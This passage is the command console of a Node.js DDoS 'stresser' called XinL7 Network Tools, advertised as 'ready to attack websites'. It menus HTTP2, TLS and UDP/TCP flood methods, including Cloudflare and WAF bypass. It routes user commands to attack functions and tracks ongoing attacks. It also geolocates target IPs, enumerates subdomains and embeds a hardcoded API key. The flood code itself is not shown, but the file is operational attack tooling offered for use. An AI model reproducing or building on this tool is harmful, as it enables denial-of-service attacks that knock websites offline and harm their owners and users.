    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\n𝑶𝒏𝒈𝒐𝒊𝒏𝒈 𝑨𝒕𝒕𝒂𝒄𝒌🕊️🪽:\n");
  processList.forEach((process) => {
console.log(`𝑫𝒐𝒎𝒂𝒊𝒏🕊️🪽: ${process.target}
𝑴𝒆𝒕𝒉𝒐𝒅𝒔🕊️🪽: ${process.methods}
𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏🕊️🪽: ${process.duration} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔
𝑺𝒊𝒏𝒄𝒆🕊️🪽: ${Math.floor((Date.now() - process.startTime) / 1000)} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔 𝑨𝒈𝒐\n`);
  });
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <𝑰𝑷 𝑨𝒅𝒅𝒓𝒆𝒔𝒔 𝑻𝒂𝒓𝒈𝒆𝒕>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`𝑱𝒂𝒏𝒈𝒂𝒏 𝑫𝒊 𝑼𝒍𝒂𝒏𝒈𝒊 𝑲𝒂𝒌 𝑵𝒂𝒏𝒕𝒊 𝑫𝒊 𝑫𝒆𝒍𝒆𝒕𝒆 𝑼𝒔𝒆𝒓 𝑴𝒖🕊️🪽`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.log(`
 - 𝑭𝒍𝒂𝒈: ${ipInfo.country_flag}
 - 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: ${ipInfo.country_name}
 - 𝑪𝒂𝒑𝒊𝒕𝒂𝒍: ${ipInfo.country_capital}
 - 𝑪𝒊𝒕𝒚: ${ipInfo.city}
 - 𝑰𝑺𝑷: ${ipInfo.isp}
 - 𝑶𝒓𝒈𝒂𝒏𝒊𝒛𝒂𝒕𝒊𝒐𝒏: ${ipInfo.organization}
 - 𝑳𝒂𝒕: ${ipInfo.latitude}
 - 𝑳𝒐𝒏𝒈: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}\x1b[0m
 𝑻𝒚𝒑𝒆 [\x1b[1m\x1b[35m𝑪𝒍𝒔\x1b[0m] 𝑻𝒐 𝑪𝒍𝒆𝒂𝒓 𝑻𝒆𝒓𝒎𝒊𝒏𝒂𝒍  
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}🕊️🪽`)
      sigma()
    }
    }
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder <𝑫𝒐𝒎𝒂𝒊𝒏 𝑻𝒂𝒓𝒈𝒆𝒕>
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.log(`
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊🪽`)
  sigma()
}
sigma()
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
𝑪𝒓𝒆𝒂𝒕𝒆𝒅 𝑨𝒏𝒅 𝑪𝒐𝒅𝒆𝒅 XinL7 Network Tools
 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${teksungu}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
THANKS TO :
Tuhan ( Maha Pencipta )
Orang Tua ( Yang Melahirkan Saya )
XinL7-C2 NOT SEPUH ( Developer XinL7 )
My Girls ( Yang Sudah Banyak Support Saya, Dll )
My Friend ( Yang Sudah Banyak Membantu Saya )
My Team ( Yang sudah Banyak Memberikan Ilmu dan Membantu Saya )
PLN Dan Wifi ( Sebagai Alat Internet Dan Penyedia Listrik )
YouTube ( Music Yang Menemani Saya )
`
permen.question(`${back_putih}${teksungu}XinL7 Network Tools${Reset}➔ ${back_putih}${teksungu}𝑪𝒐𝒏𝒔𝒐𝒍𝒆${Reset}: \n`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
\x1b[38;2;173;150;255m 
                 ╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦
                 ╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║
                 ╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝.         \x1b[0m
\x1b[32m[=========================================]  
\x1b[32m|| LAYER7 - showing Layer7 Methods 
\x1b[32m|| LAYER4 - showing Layer4 Methods
\x1b[32m|| TUTORIAL - steps
\x1b[32m|| SCRAPE - check ddos status 
\x1b[32m|| MONITOR - check something 
\x1b[32m|| ONGOING - ongoing Attack
\x1b[32m|| SUBDO-FINDER - search for web info 
\x1b[32m|| TRACK-IP - search for address 
\x1b[32m|| CREDITS - made by 
\x1b[32m|| CLS - delete terminal messages 
\x1b[32m|| EXIT / OUT
\x1b[32m[=========================================]
`);
    sigma();
          } else if (command === 'layer7') {
    console.log(`
🟢 | UserName: XinL7 - ( 🐧 ) | Vip:  Aktif  | SuperVip:  Aktif
\x1b[38;2;173;150;255m     
         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m

\x1b[32m┏────────────────[ METHODS LAYER7 VIP ]──────────────────────
\x1b[32m┃   • <METHODS> <TARGET> <PORT> <TIME>
\x1b[32m┗──────────────────────────────────────────────────
 ► ${back_putih}${teksungu}[ VIP LAYER7 METHODS ]${Reset}
     - ${teksungu}FLOOD${Reset} - Flood Headers High
     - ${teksungu}H2-CFB${Reset} - Cloudflare With Browser
     - ${teksungu}CF-BYPASS${Reset} - Bypass Cloudflare
     - ${teksungu}H2-FLOOD${Reset} - H2 Rapid Riset
     - ${teksungu}TLS${Reset} - High Flooding Tls
     - ${teksungu}BOM${Reset} - HTTP2 Request
     - ${teksungu}H2X-VIP${Reset} - H2 High Flooding Rps
     - ${teksungu}H2-SLASH${Reset} - H2 High Rps
     - ${teksungu}WAF-BYPASS${Reset} - Waf Uam Bypass
     - ${teksungu}XINL7${Reset} - XinL7 With Browser
\x1b[32m───────────────────────────────────────────────────
`);
    sigma();
          } else if (command === 'layer4') {
    console.log(`
🟢 | UserName: XinL7 - ( 🐧 ) | Vip:  Aktif  | SuperVip:  Aktif
\x1b[38;2;173;150;255m     
         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m
\x1b[32m┏──────────────────[ METHODS LAYER4 VIP ]─────────────────────
\x1b[32m┃• <METHODS> <TARGET> <PORT> <TIME>
\x1b[32m┗───────────────────────────────────────────────────
 ►  ${back_putih}${teksungu}[ VIP LAYER4 METHODS ]${Reset}
     - ${teksungu}UDP${Reset} - Udp Kill Flooding
     - ${teksungu}TCP${Reset} - Tcp With Flooding
     - ${teksungu}KILLSSH${Reset} - Network SSH
     - ${teksungu}KILLDO${Reset} - Suspend D.O
     - ${teksungu}OVH${Reset} - Tcp Ovh Kill
     - ${teksungu}TICIPI${Reset} - With Killer IP
     - ${teksungu}PING${Reset} - Show IMB 
\x1b[32m────────────────────────────────────────────────────
`);
    sigma();
    } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
   } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
    } else if (command === 'scrape') {
    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma();
    } else if (command === 'flood') {
    flood(args)
    } else if (command === 'h2-flood') {
    h2flood(args)
    } else if (command === 'cf-bypass') {
    cfbypass(args)
    } else if (command === 'h2-cfb') {
    h2cfb(args)
    } else if (command === 'tls') {
    tls(args)
    } else if (command === 'xinl7') {
    xinl7(args)
    } else if (command === 'bom') {
    bom(args)
    } else if (command === 'h2x-vip') {
    h2xvip(args)
    } else if (command === 'waf-bypass') {
    wafbypass(args)
    } else if (command === 'killssh') {
    killSSH(args);
    } else if (command === 'killdo') {
    killDo(args);
    } else if (command === 'udp') {
    udp_flood(args);
    } else if (command === 'tcp') {
    tcp_flood(args);
    } else if (command === 'ovh') {
    ovh(args)
    } else if (command === 'tcp-pps') {
    tcppps(args)
    } else if (command === 'ticipi') {
    ticipi(args)
    } else if (command === 'ping') {
    pod(args)
    } else if (command === 'tcpnew') {
    tcpbaru(args)
    } else if (command === 'h2-slash') {
    h2slash(args)
    } else if (command === 'tutorial') {
  	console.log(`
 Comand XinL7 Network Tools
 Input !! 
 Example => Flood https://website.com 443 60`);
    sigma();
    } else if (command === 'monitor') {
    monitorOngoingAttacks()
    sigma()
    } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
    } else if (command === 'track-ip') {
    trackIP(args);
    } else if (command === 'subdo-finder') {
    subdomen(args)
    } else if (command === 'exit') {
    GoodBye(args);
    sigma();
    } else if (command === 'out') {
    GoodBye(args);
    sigma();
    } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()